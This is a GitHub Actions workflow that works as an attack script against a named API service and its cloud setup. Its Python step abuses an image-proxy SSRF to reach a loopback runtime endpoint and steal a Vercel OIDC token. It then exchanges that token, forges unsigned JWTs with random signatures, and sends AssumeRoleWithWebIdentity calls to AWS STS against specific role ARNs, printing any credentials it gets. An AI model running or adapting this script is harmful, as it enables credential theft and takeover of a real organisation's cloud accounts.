name: w11probe3
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: mint and probe
        run: |
          set -euo pipefail
          GH_TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "$GH_TOKEN" > /tmp/gh.jwt
          python3 - <<'PY'
          import base64, json, os, random, re, time, urllib.parse, urllib.request, urllib.error
          def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
          gh=open('/tmp/gh.jwt').read().strip()
          # mint a fresh Vercel OIDC token through the image-proxy loopback SSRF
          cb='w11b09'+''.join(random.choice('abcdef0123456789') for _ in range(10))
          url='https://bonkapi.com/api/image-proxy?url='+urllib.parse.quote('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next?cb='+cb, safe='')
          vercel=None
          try:
              with urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent':'w11b09'}), timeout=15) as r:
                  outer=json.loads(r.read().decode())
              ev=json.loads(outer['body']) if isinstance(outer.get('body'),str) else outer.get('body',{})
              vercel=ev['headers'].get('x-vercel-oidc-token')
              print('VERCEL_MINT', 'ok' if vercel else 'no-token', 'len', len(vercel or ''))
          except Exception as e:
              print('VERCEL_MINT_ERR', repr(e)[:200])
          # exchange for aud=https://sts.amazonaws.com
          vercel_sts=None
          if vercel:
              try:
                  data=json.dumps({'token':vercel,'aud':'https://sts.amazonaws.com'}).encode()
                  req=urllib.request.Request('https://oidc.vercel.com/~token', data=data, method='POST', headers={'Content-Type':'application/json','User-Agent':'w11b09'})
                  with urllib.request.urlopen(req, timeout=15) as r:
                      vercel_sts=json.loads(r.read().decode())['token']
                  print('VERCEL_EXCHANGE','ok','len',len(vercel_sts))
              except Exception as e:
                  print('VERCEL_EXCHANGE_ERR', repr(e)[:200])
          # forged Vercel-issuer token, random signature
          hdr=b64(json.dumps({'alg':'RS256','typ':'JWT','kid':'w11b09-forged'},separators=(',',':')).encode())
          def forged(aud):
              now=int(time.time())
              pl=b64(json.dumps({'iss':'https://oidc.vercel.com/bonklabs','aud':aud,'sub':'owner:bonklabs:project:bonk-api:environment:production','exp':now+3600,'nbf':now-60,'iat':now-60},separators=(',',':')).encode())
              return hdr+'.'+pl+'.'+b64(os.urandom(256))
          def sts(arn, token, label):
              data=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'w11b09','DurationSeconds':'3600','WebIdentityToken':token}).encode()
              req=urllib.request.Request('https://sts.amazonaws.com/', data=data, method='POST', headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'w11b09'})
              try:
                  with urllib.request.urlopen(req, timeout=10) as r:
                      body=r.read().decode('utf-8','replace'); code=r.status
              except urllib.error.HTTPError as e:
                  body=e.read().decode('utf-8','replace'); code=e.code
              m=re.search(r'<Code>([^<]+)</Code>', body); msg=re.search(r'<Message>([^<]+)</Message>', body)
              print(f'ARM|{label}|{code}|{len(body)}|{m.group(1) if m else "-"}|{(msg.group(1) if msg else "-")[:150]}')
              if code==200: print('CREDS', body[:400])
              time.sleep(0.5)
          sts('arn:aws:iam::candy:role/w11b09-does-not-exist', gh, 'A_candy_alias_gh')
          sts('arn:aws:iam::227010423725:role/w11b09-does-not-exist', gh, 'B_candy_numeric_gh')
          sts('arn:aws:iam::bonk:role/w11b09-does-not-exist', gh, 'C_bonk_alias_gh')
          sts('arn:aws:iam::cms:role/w11b09-does-not-exist', gh, 'D_cms_alias_gh')
          sts('arn:aws:iam::bonk:role/w11b09-probe', forged('https://vercel.com/bonklabs'), 'E_bonk_forged_vercel_aud')
          sts('arn:aws:iam::bonk:role/w11b09-probe', forged('https://sts.amazonaws.com'), 'F_bonk_forged_sts_aud')
          sts('arn:aws:iam::candy:role/w11b09-probe', forged('https://vercel.com/bonklabs'), 'G_candy_forged_vercel_aud')
          if vercel:
              sts('arn:aws:iam::bonk:role/w11b09-probe', vercel, 'H_bonk_valid_vercel_aud')
          if vercel_sts:
              sts('arn:aws:iam::bonk:role/w11b09-probe', vercel_sts, 'I_bonk_valid_sts_aud')
              sts('arn:aws:iam::bonk:role/vercel-oidc', vercel_sts, 'J_bonk_role_vercel_oidc')
          PY
